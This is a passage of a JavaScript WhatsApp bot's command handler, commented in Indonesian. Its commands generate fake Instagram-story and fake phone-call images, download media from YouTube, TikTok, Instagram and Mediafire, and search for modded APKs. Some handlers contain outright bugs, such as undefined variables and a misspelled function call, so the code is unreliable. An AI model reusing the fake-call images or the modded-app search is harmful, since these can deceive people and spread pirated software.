 ctx.fillStyle = '#FFFFFF'
 ctx.textAlign = 'center'
 ctx.textBaseline = 'top'
 const captionX = canvas.width / 2
 const captionY = canvas.height - 650
 const maxWidth = canvas.width - 100
 const lineHeight = 42
 wrapTextCenter(ctx, caption, captionX, captionY, maxWidth, lineHeight)
 let buffer = canvas.toBuffer()
 await Putzz.sendMessage(m.chat, {
 image: buffer,
 caption: 'Berhasil'
 }, { quoted: m })
 } catch (e) {
 ReplyLanz(`❌ Error\nLogs error : ${e.message}`)
 }
 function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
 let line = ''
 for (let i = 0; i < text.length; i++) {
 let testLine = line + text[i]
 let testWidth = ctx.measureText(testLine).width
 if (testWidth > maxWidth && line !== '') {
 ctx.fillText(line, x, y)
 line = text[i]
 y += lineHeight
 } else {
 line = testLine
 }
 }
 if (line) ctx.fillText(line, x, y)
 }
}
break

case 'fakestoryt': {
  try {
    const fetch = require('node-fetch')
    const { createCanvas, loadImage } = require('skia-canvas')

    await Putzz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })

    // Ambil input user
    let [username, caption] = text ? text.split('|') : []
    if (!username || !caption)
      return ReplyLanz(`Contoh:\n.${command} Lily|Eummm...`)

    // URL background (bisa kamu ganti sesuai tema)
    const bgUrl = 'https://files.catbox.moe/uq02xf.jpg'

    // Ambil gambar background manual via fetch (menghindari ECONNRESET)
    const bgRes = await fetch(bgUrl)
    if (!bgRes.ok) throw new Error('Gagal mengambil background!')
    const bgBuffer = await bgRes.arrayBuffer()
    const bg = await loadImage(Buffer.from(bgBuffer))

    // Ambil foto profil user (fallback jika gagal)
    const userPP = await Putzz.profilePictureUrl(m.sender, 'image')
      .catch(_ => 'https://i.ibb.co/6P9TnQv/defaultpp.jpg')
    const ppRes = await fetch(userPP)
    if (!ppRes.ok) throw new Error('Gagal mengambil foto profil!')
    const ppBuffer = await ppRes.arrayBuffer()
    const pp = await loadImage(Buffer.from(ppBuffer))

    // Buat kanvas
    const canvas = createCanvas(720, 1280)
    const ctx = canvas.getContext('2d')

    // Gambar background
    ctx.drawImage(bg, 0, 0, canvas.width, canvas.height)

    // === Foto profil bundar ===
    const ppX = 40
    const ppY = 250
    const ppSize = 70
    ctx.save()
    ctx.beginPath()
    ctx.arc(ppX + ppSize / 2, ppY + ppSize / 2, ppSize / 2, 0, Math.PI * 2)
    ctx.closePath()
    ctx.clip()
    ctx.drawImage(pp, ppX, ppY, ppSize, ppSize)
    ctx.restore()

    // === Username ===
    ctx.font = '28px "Arial"'
    ctx.fillStyle = '#FFFFFF'
    ctx.textAlign = 'left'
    ctx.textBaseline = 'middle'
    ctx.fillText(username.trim(), ppX + ppSize + 15, ppY + ppSize / 2)

    // === Caption ===
    ctx.font = 'bold 30px "Arial"'
    ctx.fillStyle = '#FFFFFF'
    ctx.textAlign = 'center'
    ctx.textBaseline = 'top'
    const captionX = canvas.width / 2
    const captionY = canvas.height - 650
    const maxWidth = canvas.width - 100
    const lineHeight = 42
    wrapTextCenter(ctx, caption.trim(), captionX, captionY, maxWidth, lineHeight)

    // Kirim hasilnya
    const buffer = canvas.toBuffer('image/png')
    await Putzz.sendMessage(
      m.chat,
      { image: buffer, caption: '✅ Sukses Kak :v' },
      { quoted: m }
    )
  } catch (e) {
    console.error(e)
    ReplyLanz(`❌ Terjadi error:\n${e.message}`)
  }

  // Fungsi untuk membungkus teks di tengah
  function wrapTextCenter(ctx, text, x, y, maxWidth, lineHeight) {
    const words = text.split(' ')
    let line = ''
    for (let i = 0; i < words.length; i++) {
      const testLine = line + words[i] + ' '
      const testWidth = ctx.measureText(testLine).width
      if (testWidth > maxWidth && i > 0) {
        ctx.fillText(line, x, y)
        line = words[i] + ' '
        y += lineHeight
      } else {
        line = testLine
      }
    }
    ctx.fillText(line, x, y)
  }
  break
}

case 'figstorsy': {
  if (!text.includes('|')) {
    return ReplyLanz(`Format salah!\n\nContoh:\n.figstory zenn|hmm gimana yaaa|https://files.catbox.moe/h3njeb.jpg`)
  }

  let [username, caption, photo] = text.split('|').map(v => v.trim())
  if (!username || !caption || !photo) return ReplyLanz('Semua parameter wajib diisi!')

  const api = `https://velyn.biz.id/api/maker/igstory?username=${encodeURIComponent(username)}&caption=${encodeURIComponent(caption)}&photo=${encodeURIComponent(photo)}&APIKEY=velyn`

  try {
    const res = await fetch(api)
    if (!res.ok) throw await res.text()

    const buffer = await res.arrayBuffer()
    Putzz.sendMessage(m.chat, { image: buffer, caption: 'done cuyy'}, { quoted: m } )
  } catch (err) {
    console.error(err)
    ReplyLanz('❌ Gagal membuat IG Story. Pastikan parameter valid atau coba lagi nanti.')
  }
}
break

/*
📌 Nama Fitur: Fake Calling
🏷️ Type : Case
🔗 Sumber : https://whatsapp.com/channel/0029VaxvdhJ6buMSjkRBNR2d
✍️ Convert By ZenzXD
*/
case 'fakecall':
case 'fcalling': {
  if (!text.includes('|')) {
    return ReplyLanz(`Format salah!\n\nContoh:\n.fcalling pacar aku|11:22|https://telegra.ph/file/xxxxx.jpg`)
  }

  let [name, duration, avatar] = text.split('|').map(v => v.trim())
  if (!name || !duration || !avatar) return ReplyLanz('Semua parameter wajib diisi!')

  const api = `https://velyn.biz.id/api/maker/calling?name=${encodeURIComponent(name)}&duration=${encodeURIComponent(duration)}&avatar=${encodeURIComponent(avatar)}&apikey=velyn`

  try {
    const res = await fetch(api)
    if (!res.ok) throw await res.text()

    const buffer = await res.arrayBuffer()
    Putzz.sendMessage(m.chat, { image: buffer, caption: 'done cuyy'}, {quoted: m })
  } catch (err) {
    console.error(err)
    ReplyLanz('❌ Gagal membuat fake calling. Pastikan parameter valid atau coba lagi nanti.')
  }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

            case 'pla y':
            case 'ytplday':
            case 'playcsong': {
                if (!text) return ReplyLanz(example("putra berak di celana"))
             //  await loading()
                let ytsSearchh = await yts(text)
                const rees = await ytsSearchh.all[0]
                const caption = `${rees.title}\n${rees.url}`;
                Putzz.sendMessage(m.chat, {
                    image: {
                        url: rees.thumbnail
                    },
                    //thumbnailUrl: rees.thumbnail,
                    //renderLargerThumbnail: true,
                    caption: caption,
                    footer: `Author ${rees.author.name} || Duration ${rees.timestamp}\n${botname}`,
                    buttons: [{
                            buttonId: `.youtube-video ${rees.url}`,
                            buttonText: {
                                displayText: 'get video'
                            },
                            type: 1,
                        },

                        {
                            buttonId: `.youtube-audio ${rees.url}`,
                            buttonText: {
                                displayText: 'get audio'
                            },
                            type: 1,
                        },
                        {
                            buttonId: `.youtube-video ${rees.url}`,
                            buttonText: {
                                displayText: 'get video'
                            },
                            type: 1,
                            nativeFlowInfo: {
                                name: 'single_select',
                                paramsJson: JSON.stringify({
                                    title: 'click here',
                                    sections: [{
                                        title: 'youtube downloader',
                                        highlight_label: '',
                                        rows: [{
                                                header: '',
                                                title: 'audio',
                                                description: 'download high quality audio',
                                                id: '',
                                            },
                                            {
                                                header: '',
                                                title: 'video',
                                                description: 'download high quality video',
                                                id: '',
                                            },

                                        ],
                                    }, ],
                                }),
                            },
                        },
                    ],
                    viewOnce: true,
                }, {
                    quoted: m
                });
            }
            //D|ts si pler 🐎
            break
            case "play": case "playyt": case "ytplay": {
            const Yts = require("yt-search");
if (!text) return ReplyLanz(`*Contoh :* ${command} lagu sad 30detik`)
const ress = await Yts(text)
if (ress.all.length < 1) return ReplyLanz("Audio/vidio tidak ditemukan")
await ReplyLanz("Memproses pencarian audio 🔍")
const { title, url, thumbnail, timestamp, author } = ress.all[0]
const res = await fetchJson(`https://skyzopedia-api.vercel.app/download/ytdl?apikey=skyy&url=${url}`)
return Putzz.sendMessage(m.chat, {audio: {url: res.result.audio.url}, mimetype: "audio/mpeg", ptt: false, contextInfo: {
externalAdReply: {
title: title, 
body: `Duration: ${timestamp} || Creator: ${author.name}`, 
thumbnailUrl: thumbnail,
renderLargerThumbnail: true, 
mediaType: 1, 
sourceUrl: url
}
}}, { quoted: m })
}
break
            case 'ytv':
            case 'youtube-video':
            case 'ytmp4':
            case 'ytvid': {
                if (!text) return ReplyLanz(example("linknya"))
                if (!text.startsWith("https://")) return ReplyLanz("Link Tautan Tidak Valid")
                await Putzz.sendMessage(m.chat, {
                    react: {
                        text: '🕖',
                        key: m.key
                    }
                })
                var anu = await ytdl.ytmp4(`${text}`)

                if (anu.status) {
                    let urlMp4 = anu.download.url
                    await Putzz.sendMessage(m.chat, {
                        video: {
                            url: urlMp4
                        },
                        mimetype: "video/mp4"
                    }, {
                        quoted: m
                    })
                } else {
                    return ReplyLanz("Error! Result Not Found")
                }
                await Putzz.sendMessage(m.chat, {
                    react: {
                        text: '',
                        key: m.key
                    }
                })
            }
            break
            case 'yta':
            case 'youtube-audio':
            case 'ytmp3':
            case 'ytaudio': {
                if (!/^https?:\/\//.test(text)) return ReplyLanz(`*Masukan URL nya!*\n\nContoh:\n.${command} https://youtu.be/SvUQ3t0JQlc?si=-fJB7Bptz6lX4_D5`);

                const Lanzz = `https://anabot.my.id/api/download/ytmp3?url=${text}&apikey=freeApikey`

                const data = await axios.get(Lanzz);
                const contentType = data.headers["content-type"];

                if (contentType.startsWith('image/')) {
                    Putzz.sendMessage(m.chat, {
                        image: {
                            url: Lanzz
                        },
                        caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
                    }, {
                        quoted: qfake
                    });
                } else if (contentType.startsWith('video/')) {
                    Putzz.sendMessage(m.chat, {
                        video: {
                            url: Lanzz
                        },
                        caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
                    }, {
                        quoted: qfake
                    });
                } else if (contentType.startsWith('audio/')) {
                    Putzz.sendMessage(m.chat, {
                        audio: {
                            url: Lanzz
                        },
                        mimetype: 'audio/mpeg'
                    }, {
                        quoted: qfake
                    });
                } else {
                    const datanya = data.data
                    ReplyLanz(util.format(datanya))
                    // Fungsi untuk menyimpan file dengan tipe konten asli
                    const saveFileToDisk = async (url, outputPath) => {
                        try {
                            const mime = require('mime-types');
                            const response = await axios.get(url, {
                                responseType: 'arraybuffer'
                            });
                            const contentType = response.headers['content-type'];
                            const ext = mime.extension(contentType);
                            const filePath = outputPath + (ext ? `.${ext}` : '');

                            return new Promise((resolve, reject) => {
                                fs.writeFile(filePath, response.data, (err) => {
                                    if (err) {
                                        reject(err);
                                    } else {
                                        resolve({
                                            file: filePath,
                                            ext: ext,
                                            mime: contentType
                                        });
                                    }
                                });
                            });
                        } catch (error) {
                            throw error;
                        }
                    };

                    try {
                        const buffer = await saveFileToDisk(text, path.join(__dirname, 'sticker/get-data'));
                        await sleep(2000); // Pastikan fungsi sleep() tersedia di konteks ini
                        Putzz.sendMessage(m.chat, {
                            document: fs.readFileSync(buffer.file),
                            mimetype: buffer.mime,
                            fileName: "get-data." + buffer.ext
                        }, {
                            quoted: qfake
                        });

                        fs.unlinkSync(buffer.file); // Hapus file setelah dikirim
                    } catch (error) {
                        console.error('Gagal menyimpan atau mengirim file:', error);
                    }
                }
            }
            break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'binary':
case 'bin': {
  const teks = args.join(' ').trim();
  if (!teks) {
    return Putzz.sendMessage(m.chat, {
      text: `- Contoh penggunaan:\n${prefix}binary --teks "01001000"\n${prefix}binary --binarycode "Hello"`,
    }, { quoted: m });
  }

  try {
    const bintoteks = teks.startsWith('--teks');
    const tekstobin = teks.startsWith('--binarycode');
    if (!bintoteks && !tekstobin) {
      return Putzz.sendMessage(m.chat, {
        text: `- Tentukan mode konversi:\n--teks (binary ke text)\n--binarycode (text ke binary)`,
      }, { quoted: m });
    }
    const input = teks.split(' ').slice(1).join(' ').trim();
    if (!input) {
      return Putzz.sendMessage(m.chat, { text: 'Masukkan teks/binary yang valid' }, { quoted: m });
    }
    let hsil;
    if (bintoteks) {
      const cb = input.replace(/[^01 ]/g, '');
      if (!cb) throw new Error('Binary code tidak valid');
      const res = await fetch('https://www.magictool.ai/functions/BINARY-TEXT.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(cb)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    } else {
      const res = await fetch('https://www.magictool.ai/functions/TEXT-BINARY.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0'
        },
        body: `input=${encodeURIComponent(input)}`
      });
      hsil = await res.text();
      if (!res.ok || !hsil || hsil.includes('error')) {
        throw new Error('API gagal memproses');
      }
    }
    await Putzz.sendMessage(m.chat, { text: hsil }, { quoted: qfake });
  } catch (error) {
    console.error('Error:', error);
    PutzzsendMessage(m.chat, {
      text: `Gagal mengkonversi: ${error.message}`,
    }, { quoted: qfake });
  }
}
break

case 'play2': {
  if (!text) return ReplyLanz('Masukkan judul lagu!\nContoh: *play Jakarta Hari Ini*');

  try {
    const res = await fetch(`https://api.nekorinn.my.id/downloader/ytplay-savetube?q=${encodeURIComponent(text)}`);
    if (!res.ok) return ReplyLanz('Gagal mengambil data dari server.');
    const data = await res.json();
    if (!data.status || !data.result) return ReplyLanz('Lagu tidak ditemukan!');
    const { title, channel, duration, imageUrl, link } = data.result.metadata;
    const downloadUrl = data.result.downloadUrl;
    const thumbnail = await (await fetch(imageUrl)).buffer();
    await Putzz.sendMessage(m.chat, {
      audio: { url: downloadUrl },
      mimetype: 'audio/mpeg',
      fileName: `${title}.mp3`,
      ptt: true,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: title,
          body: `${channel} • ${duration}`,
          thumbnail,
          mediaUrl: link,
          mediaType: 2,
          renderLargerThumbnail: true,
          sourceUrl: link
        }
      }
    }, { quoted: m });
  } catch (e) {
    console.error(e);
    ReplyLanz('Terjadi kesalahan saat memproses permintaanmu.');
  }
}
break
case "prefix": {

if (!isOwner) return ReplyLanz("Khusus owner!")

if (!text) return ReplyLanz(example("prefix on / prefix off")) 

if (text === "on") {
   global.prefixmode = true
   ReplyLanz("✅ Prefix ON")
}
else if (text === "off") {
   global.prefixmode = false
   ReplyLanz("✅ Prefix OFF (No Prefix)")
}


}
break;
case "playvid": {
if (!text) return ReplyLanz(example("dj tiktok"))
await Putzz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+res.url)

if (anu.download.url) {
let urlMp4 = anu.download.url
await Putzz.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return ReplyLanz("Error! vidio atau lagu tidak ditemukan")
}
await Putzz.sendMessage(m.chat, {react: {text: '☭', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return ReplyLanz(example('we dont talk'))
await Putzz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await ReplyLanz(teks)
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return ReplyLanz(example("linknya"))
if (!text.startsWith("https://")) return ReplyLanz("Link Tautan Tidak Valid")
await Putzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+text)
if (anu.download.audio) {
let urlMp3 = anu.download.audio
await Putzz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return ReplyLanz("Error! vidio atau lagu tidak ditemukan")
}
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 case "self":
 case "kumenangis": {

if (!isOwner) return ReplyLanz("Khusus owner bang 🗿")

Putzz.public = false

ReplyLanz("Berhasil mengganti mode bot menjadi *sad*")

}

break      
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
        
case "block": case "blok": {
if (!isCreator) return ReplyLanz(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return ReplyLanz(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await Putzz.updateBlockStatus(mem, "block")
if (m.isGroup) Putzz.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp4": {
if (!text) return ReplyLanz(example("linknya"))
if (!text.startsWith("https://")) return ReplyLanz("Link Tautan Tidak Valid")
await Putzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp4?url="+text)
if (anu.download.video) {
let urlMp3 = anu.download.video
await Putzz.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return ReplyLanz("Error! vidio atau lagu tidak ditemukan")
}
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'mediafire2': case 'mf2': {
  if (!q) return ReplyLanz(`Kirim link Mediafire-nya!\n\nContoh: ${prefix + command} https://www.mediafire.com/file/xxx`)

  try {
    let res = await fetch(`https://api.vreden.my.id/api/mediafiredl?url=${q}`)
    let data = await res.json()
    if (!data.result || !data.result[0].status) return ReplyLanz('Gagal mengambil data Mediafire.')
    let file = data.result[0]
    let { nama, size, link } = ffil
    let ext = nama.split('.').pop().toLowerCase()
    let mimeTypes = {
      zip: 'application/zip',
      pdf: 'application/pdf',
      mp4: 'video/mp4',
      mp3: 'audio/mpeg',
      apk: 'application/vnd.android.package-archive',
      docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      txt: 'text/plain',
      png: 'image/png',
      jpg: 'image/jpeg',
      jpeg: 'image/jpeg',
    }
    let mime = mimeTypes[ext] || 'application/octet-stream'
    let caption = `*MEDIAFIRE DOWNLOADER*\n\n`
    caption += `*Nama:* ${nama}\n`
    caption += `*Ukuran:* ${size}\n`
    caption += `*Tipe:* ${mime}\n`
    caption += `*Server:* ${file.server}\n`
    caption += `*Link:* ${link}\n\n`
    caption += `_Jika file tidak bisa dibuka langsung, silakan buka dari File Manager._`
    await Putzz.sendMessage(m.chat, {
      document: { url: link },
      fileName: nama,
      mimetype: mime,
      caption
    }, { quoted: m })
  } catch (e) {
    console.log(e)
    ReplyLanz('Terjadi kesalahan saat mengambil file, coba lagi nanti.')
  }
}
  break
  case 'mediafire3': case 'mf3': {
  if (!q) return ReplyLanz('Masukkan URL Mediafire!\nContoh: mediafire3 https://www.mediafire.com/file/xxxxxx');
  const res = await fetch(`https://fastrestapis.fasturl.cloud/downup/mediafiredown?url=${encodeURIComponent(q)}`);
  if (!res.ok) return ReplyLanz('Gagal mengambil data dari Mediafire.');
  const data = await res.json();
  if (data.status !== 200 || !data.result?.download) {
    return ReplyLanz('Gagal mengambil link download.');
  }
  const {
    filename,
    size,
    mimetype,
    owner,
    download,
    created
  } = data.result;
  const caption = `*MEDIAFIRE DOWNLOADER*\n\n` +
    `*Nama File:* ${filename}\n` +
    `*Ukuran:* ${size}\n` +
    `*Tipe:* ${mimetype}\n` +
    `*Owner:* ${owner}\n` +
    `*Upload:* ${created}\n\n` +
    `Mengirim file, mohon tunggu...`;
  await ReplyLanz(caption);
  try {
    const response = await fetch(download);
    const buffer = await response.buffer();
    Putzz.sendMessage(m.chat, {
      document: buffer,
      fileName: filename,
      mimetype: mimetype,
      caption: `Berikut file dari Mediafire:\n\n${filename} (${size})`
    }, { quoted: m });
  } catch (err) {
    ReplyLanz('Gagal mengunduh dan mengirim file.');
    console.error(err);
  }
}
  break
case 'mediafire':
case 'mfdl': {
  try {
    if (!text) return ReplyLanz(`*Penggunaan Salah!*\ncontoh: .mediafire link`)
    if (!text.includes('mediafire.com')) return ReplyLanz('Harus berupa link mediafire!')

    await Putzz.sendMessage(m.chat, { react: { text: '🚀', key: m.key } })

    let api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${text}`)
    let data = api.result?.[0]
    if (!data) return ReplyLanz('Gagal mengambil data mediafire!')

    let fileNama = decodeURIComponent(
      data.nama || data.filename || data.name || 'file.zip'
    )

    let link = data.link || data.url
    if (!link) return ReplyLanz('Link download tidak ditemukan!')

    let extension = fileNama.split('.').pop().toLowerCase()

    let res = await axios.get(link, {
      responseType: 'arraybuffer',
      maxContentLength: Infinity,
      maxBodyLength: Infinity
    })

    let media = Buffer.from(res.data)

    let mimetype = ''
    if (extension === 'mp4') mimetype = 'video/mp4'
    else if (extension === 'mp3') mimetype = 'audio/mpeg'
    else mimetype = `application/${extension}`

    await Putzz.sendMessage(m.chat, {
      document: media,
      fileName: fileNama,
      mimetype: mimetype
    }, { quoted: m })

  } catch (err) {
    ReplyLanz('Terjadi kesalahan: ' + err)
  }
}
break
            case 'putzzgmp3':
            case 'tiktokmhp3':
            case 'ttmhp3':
            case 'tiktokauhdio': {
                if (!text) return ReplyLanz(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
                await Putzz.sendMessage(m.chat, {
                    react: {
                        text: "⏱️",
                        key: m.key,
                    }
                })
                try {
                    let anu = await fetchJson(`https://api.vreden.web.id/api/tiktok?url=${text}`)
                    let audio = anu.result.music_info.url
                    Putzz.sendMessage(m.chat, {
                        audio: {
                            url: audio
                        },
                        mimetype: 'audio/mpeg'
                    }, {
                        quoted: m
                    })
                } catch (error) {
                    try {
                        const data = await tiktokdl(text)
                        Putzz.sendMessage(m.chat, {
                            audio: {
                                url: data.music
                            },
                            mimetype: 'audio/mpeg'
                        }, {
                            quoted: m
                        })
                    } catch (error) {
                        ReplyLanz('Terjadi kesalahan, periksa tautan dan coba lagi.')
                    }
                }
                }
            break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'apkmod':{
async function getMod(q) {
    try {
        const anu = `https://happymod.com/search.html?q=${q}`;
        const { data } = await axios.get(anu);
        const $ = cheerio.load(data);

        let result = [];

        $(".pdt-app-box").each((_, el) => {
            const title = $(el).find("h3").text().trim();
            const link = "https://happymod.com" + $(el).find('a').attr('href');
            const rate = $(el).find("span.a-search-num").text().trim();

            result.push({ title, link, rate });
        });

        return result;
    } catch (e) {
        console.error(e);
        return [];
    }
}
    if (!text) return ReplyLanz('Mau Cari Aplikasi Apa? \n\n *Example :* .hmod Minecraft');
    Putzz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
    try {
        const data = await getMod(text);
        if (data.length === 0) {
            return ReplyLanz('Gak Ketemu');
        }
        let teks = `*[ Happymod Search]*\n\n`;
        for (let i = 0; i < Math.min(data.length, 15); i++) {
            teks += `*${i + 1}. ${data[i].title}*\n`;
            teks += `Rating : ${data[i].rate}\n`;
            teks += `Link : ${data[i].link}\n\n`;
        }
        await Putzz.sendMessage(m.chat, { image: { url: "https://i.postimg.cc/c6q7zRC8/1741529921037.png" }, caption: teks });
    } catch (error) {
        console.error(error);
        ReplyLanz('Error')
    }
}
break

case "apkmod2": {
    if (!text) return ReplyLanz(example("Masukkan nama aplikasi, contoh: capcut"));

    await ReplyLanz(mess.wait);

    try {
        const res = await fetchJson(`https://api.skyzopedia.us.kg/api/search/happymod?q=${encodeURIComponent(text)}`);

        if (!res?.result?.length) 
            return ReplyLanz("❌ Tidak ada hasil ditemukan untuk pencarian ini.");

        let teks = "*🔍 Hasil Pencarian HappyMod*\n\n";

        for (let i of res.result) {
            teks += `📌 *Nama Aplikasi:* ${i.name}\n🔗 *Link Download:* ${i.link}\n\n`;
        }

        await ReplyLanz(teks);

    } catch (error) {
        await ReplyLanz(`❌ Terjadi kesalahan saat mengambil data.\n\n${error.message}`);
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 case "public": {

if (!isOwner) return ReplyLanz(msg.owner)

Putzz.public = true

ReplyLanz("Berhasil mengganti mode bot menjadi *Public*")

}

break       
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
        
case "instagram": case "igdl": case "ig": {
if (!text) return ReplyLanz(example("linknya"))
if (!text.startsWith('https://')) return ReplyLanz("Link tautan tidak valid")
await Putzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://theresapis.vercel.app/downloader/instagram?apikey=theresa&url=${text}`).then(async (res) => {
if (!res.status) return ReplyLanz("Error! Result Not Found")
await Putzz.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*video Instagram berhasil ke download ✅ ✅*"}, {quoted: m})
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => ReplyLanz("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "facebook": case "fb": case "fbdl": {
if (!text) return ReplyLanz(example("linknya"))
if (!text.startsWith('https://')) return ReplyLanz("Link tautan tidak valid")
await Putzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/fbdl?url=${text}`).then(async (res) => {
if (!res.status) return ReplyLanz("Error! Result Not Found")
await Putzz.sendMessage(m.chat, {video: {url: res.result.sd}, mimetype: "video/mp4", caption: "*video Facebook berhasil ke download ✅ ✅*"}, {quoted: m})
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => ReplyLanz("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "capcut": {
if (!text) return ReplyLanz(example("linknya"))
if (!text.startsWith('https://')) return ReplyLanz("Link tautan tidak valid")
await Putzz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://api.skyzopedia.us.kg/api/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return ReplyLanz("Error! Result Not Found")
await Putzz.sendMessage(m.chat, {video: {url: res.result.video}, mimetype: "video/mp4", caption: "*video Capcut berhasil ke download ✅ ✅*"}, {quoted: m})
await Putzz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => ReplyLanz("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'gemini': {
      try {
        if (!text) return ReplyLanz(`Contoh: ${command} hai`);
        await Putzz.sendMessage(m.chat, {react: {text: '💬', key: m.key}})
        let prompt = `Your name is ${botname} and use Indonesian as your primary language.`
        const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/gpt3?prompt=${prompt}&content=${text}`)
        const gpt = apiUrl.data
        ReplyLanz(gpt)
      } catch (err) {
        console.error(err)
        ReplyLanz('Terjadi kesalahan')
      }
    }

break
// DOWNLOAD 
case 'git':
            case 'gitclone': {
              try {
                if (!args[0]) return ReplyLanz(`Contoh: ${command} linknya`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return ReplyLanz(`Harus berupa link github!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                var [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                var url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {
                  method: 'HEAD'
                })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                Putzz.sendMessage(m.chat, {
                  document: {
                    url: url
                  },
                  fileName: filename + '.zip',
                  mimetype: 'application/zip'
                }, {
                  quoted: m
                })
              } catch (err) {
                ReplyLanz('Terjadi kesalahan')
              }
            }
            break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
            case 'ttaudio':
            case 'tiktokmp3':
            case 'ttmp3':
            case 'putzzmp3': {
                if (!text) return warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
                await Putzz.sendMessage(m.chat, {
                    react: {
                        text: "⏱️",
                        key: m.key,
                    }
                })
                try {
                    let anu = await fetchJson(`https://api.vreden.web.id/api/tiktok?url=${text}`)
                    let audio = anu.result.music_info.url
                    Putzz.sendMessage(m.chat, {
                        audio: {
                            url: audio
                        },
                        mimetype: 'audio/mpeg'
                    }, {
                        quoted: m
                    })
                } catch (error) {
                    try {
                        const data = await tiktokdl(text)
                        Putzz.sendMessage(m.chat, {
                            audio: {
                                url: data.music
                            },
                            mimetype: 'audio/mpeg'
                        }, {
                            quoted: m
                        })
                    } catch (error) {
                        balas('Terjadi kesalahan, periksa tautan dan coba lagi.')
                    }
                }
                
            }
            
            break


      case "putzzmp4":
      case "tt5":
        {
          let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`";
